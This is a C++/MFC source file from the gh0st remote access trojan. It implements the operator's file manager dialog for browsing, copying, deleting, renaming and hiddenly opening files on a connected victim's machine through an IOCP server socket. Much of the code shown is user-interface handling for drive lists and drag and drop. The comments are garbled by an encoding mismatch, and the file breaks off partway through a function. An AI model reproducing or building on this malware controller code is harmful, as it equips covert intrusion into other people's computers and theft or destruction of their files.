// FileManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "FileManagerDlg.h"
#include "FileTransferModeDlg.h"
#include "InputDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

typedef struct {
	LVITEM* plvi;
	CString sCol2;
} lvItem, *plvItem;
/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog


CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileManagerDlg)
	//}}AFX_DATA_INIT
	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = sfi.hIcon;	
	HIMAGELIST hImageList;
	// �[���t�ιϼЦC��
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	// �[���t�ιϼЦC��
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);

	// ��l�����Ӷǿ骺�ƾڥ]�j�p��0

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	// �O�s���{�X�ʾ��C��
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = false;
}


void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileManagerDlg)
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	//{{AFX_MSG_MAP(CFileManagerDlg)
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, OnDblclkListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, OnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, OnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, OnDblclkListRemote)
	ON_COMMAND(IDT_LOCAL_PREV, OnLocalPrev)
	ON_COMMAND(IDT_REMOTE_PREV, OnRemotePrev)
	ON_COMMAND(IDT_LOCAL_VIEW, OnLocalView)
	ON_COMMAND(IDM_LOCAL_LIST, OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, OnLocalReport)
	ON_COMMAND(IDM_LOCAL_BIGICON, OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, OnLocalSmallicon)
	ON_COMMAND(IDM_REMOTE_BIGICON, OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_LIST, OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, OnRemoteReport)
	ON_COMMAND(IDM_REMOTE_SMALLICON, OnRemoteSmallicon)
	ON_COMMAND(IDT_REMOTE_VIEW, OnRemoteView)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_STOP, OnUpdateLocalStop)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, OnUpdateRemoteStop)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_PREV, OnUpdateLocalPrev)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, OnUpdateRemotePrev)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_COPY, OnUpdateLocalCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, OnUpdateRemoteCopy)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, OnUpdateRemoteDelete)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, OnUpdateRemoteNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_DELETE, OnUpdateLocalDelete)
	ON_UPDATE_COMMAND_UI(IDT_LOCAL_NEWFOLDER, OnUpdateLocalNewfolder)
	ON_COMMAND(IDT_REMOTE_COPY, OnRemoteCopy)
	ON_COMMAND(IDT_LOCAL_COPY, OnLocalCopy)
	ON_COMMAND(IDT_LOCAL_DELETE, OnLocalDelete)
	ON_COMMAND(IDT_REMOTE_DELETE, OnRemoteDelete)
	ON_COMMAND(IDT_REMOTE_STOP, OnRemoteStop)
	ON_COMMAND(IDT_LOCAL_STOP, OnLocalStop)
	ON_COMMAND(IDT_LOCAL_NEWFOLDER, OnLocalNewfolder)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, OnRemoteNewfolder)
	ON_COMMAND(IDM_TRANSFER, OnTransfer)
	ON_COMMAND(IDM_RENAME, OnRename)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, OnEndlabeleditListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, OnEndlabeleditListRemote)
	ON_COMMAND(IDM_DELETE, OnDelete)
	ON_COMMAND(IDM_NEWFOLDER, OnNewfolder)
	ON_COMMAND(IDM_REFRESH, OnRefresh)
	ON_COMMAND(IDM_LOCAL_OPEN, OnLocalOpen)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, OnRemoteOpenHide)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, OnRclickListLocal)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, OnRclickListRemote)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg message handlers


int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
		(
		lpFileName,
		dwFileAttributes, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
		);

	return sfi.iIcon;
}

BOOL CFileManagerDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	RECT	rect;
	GetClientRect(&rect);

	/*���u�m�u����K�[���N�X*/

	// �@�w�n�w�q�u����ID�A���MRepositionBars�|���m�u���檺��m
	// ID �w�q�bAFX_IDW_CONTROLBAR_FIRST AFX_IDW_CONTROLBAR_LAST
	// ���a�u��� CBRS_TOP �|�b�u����W���ͤ@���u
    if (!m_wndToolBar_Local.Create(this, WS_CHILD |
        WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_LOCAL_TOOLBAR) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1))
    {
        TRACE0("Failed to create toolbar ");
        return -1; //Failed to create
    }
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Local.LoadTrueColorToolBar
		(
		24,    //�[���u�m�u���
		IDB_TOOLBAR,
		IDB_TOOLBAR,
		IDB_TOOLBAR_DISABLE
		);
	// �K�[�U�ԫ��s
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);


    if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
        WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, ID_REMOTE_TOOLBAR) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR2))
    {
        TRACE0("Failed to create toolbar ");
        return -1; //Failed to create
    }
    m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
    m_wndToolBar_Remote.LoadTrueColorToolBar
		(
		24,    //�[���u�m�u���    
		IDB_TOOLBAR,
		IDB_TOOLBAR,
		IDB_TOOLBAR_DISABLE
		);
	// �K�[�U�ԫ��s
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//��ܤu����
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);


	// �]�m���D
	CString str;
	str.Format("\\\\%s - ���޲z",m_IPAddress);
	SetWindowText(str);

	// ���C�����ϳ]�mImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);
	// �Ыرa�i�ױ������A��
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ܪ��A��	

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
    m_ProgressCtrl->SetRange(0, 100);           //�]�m�i�ױ��d��
    m_ProgressCtrl->SetPos(20);                 //�]�m�i�ױ����e��m
	
	FixedLocalDriveList();
	FixedRemoteDriveList();
	/////////////////////////////////////////////
	//// Set up initial variables
	m_bDragging = false;
	m_nDragIndex = -1;
	m_nDropIndex = -1;
	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// ���A���٨S���Ы�
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	// �w�쪬�A��
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ܤu����
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);
	
	GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 100) / 2);
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 28, cx, (cy - 100) / 2);
	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);


	GetClientRect(&rect);
	//��ܤu����
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);
}

void CFileManagerDlg::FixedLocalDriveList()
{
	char	DriveString[256];
	char	*pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "�W��",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "�`�j�p", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "�i�ΪŶ�", LVCFMT_LEFT, 115);

	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	char	FileSystem[MAX_PATH];
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �`�j�p
	unsigned long		FreeMB = 0; // �Ѿl�Ŷ�

	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		// �o��ϽL�����H��
		memset(FileSystem, 0, sizeof(FileSystem));
		// �o����t�ΫH���Τj�p
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		

		int	nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));
		m_list_local.SetItemData(nItem, 1);
		if (lstrlen(FileSystem) == 0)
		{
			SHFILEINFO	sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		}
		else
		{
			m_list_local.SetItemText(nItem, 1, FileSystem);
		}
		CString	str;
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}
	// ���m���a���e���|
	m_Local_Path = "";
	m_Local_Directory_ComboBox.ResetContent();

	ShowMessage("���a�G�˸��ؿ� %s ����", m_Local_Path);
}

void CFileManagerDlg::OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return;
	FixedLocalFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedLocalFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_local.GetSelectionMark();

		// �p�G���襤���A�O�ؿ�
		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)
			{
				directory = m_list_local.GetItemText(nItem, 0);
			}
		}
		// �q�զX�ظ̱o����|
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}




	// �o����ؿ�
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	// ��s���e��
	else if (directory != ".")
	{	
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}


	// �O�X�ʾ����ڥؿ�,��^�ϽL�C��
	if (m_Local_Path.GetLength() == 0)
	{
		FixedLocalDriveList();
		return;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	// ���ؼ��D
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "�W��",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "�j�p", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "�ק���", LVCFMT_LEFT, 115);

	int			nItemIndex = 0;
	m_list_local.SetItemData
		(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);

	// i �� 0 �ɦC�ؿ��Ai �� 1�ɦC���
	for (int i = 0; i < 2; i++)
	{
		CFileFind	file;
		BOOL		bContinue;
		bContinue = file.FindFile(m_Local_Path + "*.*");
		while (bContinue)
		{	
			bContinue = file.FindNextFile();
			if (file.IsDots())	
				continue;
			bool bIsInsert = !file.IsDirectory() == i;
	
			if (!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, file.GetFileName(), 
				GetIconIndex(file.GetFileName(), GetFileAttributes(file.GetFilePath())));
			m_list_local.SetItemData(nItem,	file.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(file.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			str.Format("%10d KB", file.GetLength() / 1024 + (file.GetLength() % 1024 ? 1 : 0));
			m_list_local.SetItemText(nItem, 1, str);
			CTime time;
			file.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));
		}
	}

	ShowMessage("���a�G�˸��ؿ� %s ����", m_Local_Path);
}

void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
	//This routine performs the actual drop of the item dragged.
	//It simply grabs the info from the Drag list (pDragList)
	// and puts that info into the list dropped on (pDropList).
	//Send:	pDragList = pointer to CListCtrl we dragged from,
	//		pDropList = pointer to CListCtrl we are dropping on.
	//Return: nothing.

	////Variables
	// Unhilight the drop target

	if(pDragList == pDropList) //we are return
	{
		return;
	} //EO if(pDragList...


	pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);

	if ((CWnd *)pDropList == &m_list_local)
	{
		OnRemoteCopy();
	}
	else if ((CWnd *)pDropList == &m_list_remote)
	{
		OnLocalCopy();
	}
	else
	{
		// �����F
		return;
	}
	// ���m
	m_nDropIndex = -1;
//	�a�A�U�����N�X���n�F�A�ƻs���F
// 	if(pDragList->GetSelectedCount() == 1)
// 	{
// 		char	szLabel[MAX_PATH];
// 		LVITEM	lviT;
// 		ZeroMemory(&lviT, sizeof (LVITEM)); //allocate and clear memory space for LV_ITEM
// 		lviT.iItem		= m_nDragIndex;
// 		lviT.mask		= LVIF_IMAGE | LVIF_TEXT;
// 		lviT.pszText	= szLabel;
// 		lviT.cchTextMax	= MAX_PATH;
// 		pDragList->GetItem (&lviT);
// 
// 		// Select the new item we just inserted
// 		int	iItem = (m_nDropIndex == -1) ? pDropList->GetItemCount () : m_nDropIndex;
// 
// 		pDropList->InsertItem(iItem, szLabel, lviT.iImage);
// 
// 		pDropList->SetItemState (iItem, LVIS_SELECTED, LVIS_SELECTED);
// 	}
// 	else //more than 1 item is being dropped
// 	{
// 		POSITION pos = pDragList->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
// 		while(pos) //so long as we have a valid POSITION, we keep iterating
// 		{
// 			m_nDragIndex = pDragList->GetNextSelectedItem(pos);
// 			m_nDropIndex = (m_nDropIndex == -1) ? pDropList->GetItemCount() : m_nDropIndex;	
// 
// 			char	szLabel[MAX_PATH];
// 			LVITEM	lviT;
// 			ZeroMemory(&lviT, sizeof (LVITEM)); //allocate and clear memory space for LV_ITEM
// 			lviT.iItem		= m_nDragIndex;
// 			lviT.mask		= LVIF_IMAGE | LVIF_TEXT;
// 			lviT.pszText	= szLabel;
// 			lviT.cchTextMax	= MAX_PATH;
// 			pDragList->GetItem (&lviT);
// 
// 			pDropList->InsertItem(m_nDropIndex, szLabel, lviT.iImage);
// 			pDropList->SetItemState(m_nDropIndex, LVIS_SELECTED, LVIS_SELECTED);
// 			m_nDropIndex ++;
// 			//Save the pointer to the new item in our CList
// 		} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
// 	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFileManagerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CFileManagerDlg::OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;

	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_local.GetSelectedCount() > 1) //more than 1 item in list is selected
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_local; //make note of which list we are dragging from
	m_pDropWnd = &m_list_local;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture();
	*pResult = 0;
}

void CFileManagerDlg::OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;	
	
	
	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_remote.GetSelectedCount() > 1) //more than 1 item in list is selected
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_remote; //make note of which list we are dragging from
	m_pDropWnd = &m_list_remote;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture ();
	*pResult = 0;
}

void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	//While the mouse is moving, this routine is called.
	//This routine will redraw the drag image at the present
	// mouse location to display the dragging.
	//Also, while over a CListCtrl, this routine will highlight
	// the item we are hovering over.

	//// If we are in a drag/drop procedure (m_bDragging is true)
	if (m_bDragging)
	{	
		//SetClassLong(m_list_local.m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DRAG));

		//// Move the drag image
		CPoint pt(point);	//get our current mouse coordinates
		ClientToScreen(&pt); //convert to screen coordinates
		
		//// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);

		ASSERT(pDropWnd); //make sure we have a window

		//// If we drag outside current window we need to adjust the highlights displayed
		if (pDropWnd != m_pDropWnd)
		{
			if (m_nDropIndex != -1) //If we drag over the CListCtrl header, turn off the hover highlight
			{
				TRACE("m_nDropIndex is -1\n");
				CListCtrl* pList = (CListCtrl*)m_pDropWnd;
				VERIFY (pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED));
				// redraw item
				VERIFY (pList->RedrawItems (m_nDropIndex, m_nDropIndex));
				pList->UpdateWindow ();
				m_nDropIndex = -1;
			}
		}
		
		// Save current window pointer as the CListCtrl we are dropping onto
		m_pDropWnd = pDropWnd;

		// Convert from screen coordinates to drop target client coordinates
		pDropWnd->ScreenToClient(&pt);
		
		//If we are hovering over a CListCtrl we need to adjust the highlights
		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))
		{			
			//Note that we can drop here
			SetCursor(m_hCursor);

			if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
				return;

			UINT uFlags;
			CListCtrl* pList = (CListCtrl*)pDropWnd;
			
			// Turn off hilight for previous drop target
			pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED);
			// Redraw previous item
			pList->RedrawItems (m_nDropIndex, m_nDropIndex);
			
			// Get the item that is below cursor
			m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);
			if (m_nDropIndex != -1)
			{
				// Highlight it
				pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
				// Redraw item
				pList->RedrawItems(m_nDropIndex, m_nDropIndex);
				pList->UpdateWindow();
			}
		}
		else
		{
			//If we are not hovering over a CListCtrl, change the cursor
			// to note that we cannot drop here
			SetCursor(LoadCursor(NULL, IDC_NO));
		}
	}	
	CDialog::OnMouseMove(nFlags, point);
}

void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	//This routine is the end of the drag/drop operation.
	//When the button is released, we are to drop the item.
	//There are a few things we need to do to clean up and
	// finalize the drop:
	//	1) Release the mouse capture
	//	2) Set m_bDragging to false to signify we are not dragging
	//	3) Actually drop the item (we call a separate function to do that)
	
	//If we are in a drag and drop operation (otherwise we don't do anything)
	if (m_bDragging)
	{
		// Release mouse capture, so that other controls can get control/messages
		ReleaseCapture();
		
		// Note that we are NOT in a drag operation
		m_bDragging = FALSE;
		
		CPoint pt (point); //Get current mouse coordinates
		ClientToScreen (&pt); //Convert to screen coordinates
		// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);
		ASSERT (pDropWnd); //make sure we have a window pointer
		// If window is CListCtrl, we perform the drop
		if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl)))
		{
			m_pDropList = (CListCtrl*)pDropWnd; //Set pointer to the list we are dropping on
			DropItemOnList(m_pDragList, m_pDropList); //Call routine to perform the actual drop
		}
	}	
	CDialog::OnLButtonUp(nFlags, point);
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
				return true;
		if (pMsg->wParam == VK_RETURN)
		{
			if (
				pMsg->hwnd == m_list_local.m_hWnd || 
				pMsg->hwnd == ((CEdit*)m_Local_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				FixedLocalFileList();
			}
			else if 
				(
				pMsg->hwnd == m_list_remote.m_hWnd ||
				pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd
				)
			{
				GetRemoteFileList();
			}
			return TRUE;
		}
		
	}
	// �������F���f���D��H�~���ϰ�ϵ��f����
	if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd)
	{
		pMsg->message = WM_NCLBUTTONDOWN;
		pMsg->wParam = HTCAPTION;
	}
	/*
	UINT CFileManagerDlg::OnNcHitTest (Cpoint point )
	{
		UINT nHitTest =Cdialog: : OnNcHitTest (point )
			return (nHitTest = =HTCLIENT)? HTCAPTION : nHitTest
	}
	
	�W�z�޳N�����I���Q���B�A
		��@�O�b���f���Ȥ�ϰ������ɡA���f�N���j�F
		��G�A �����A�X�]�t�X�ӵ������D�ص��f�C
	*/


	if(m_wndToolBar_Local.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Local.GetParent();
		m_wndToolBar_Local.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}
	if(m_wndToolBar_Remote.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
		m_wndToolBar_Remote.OnUpdateCmdUI((CFrameWnd*)this, TRUE);
	}

	return CDialog::PreTranslateMessage(pMsg);
}
void CFileManagerDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	m_ProgressCtrl->StepIt();
	CDialog::OnTimer(nIDEvent);
}

void CFileManagerDlg::FixedRemoteDriveList()
{
	// �[���t�βιϼЦC�� �]�m�X�ʾ��ϼЦC��
	HIMAGELIST hImageListLarge = NULL;
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

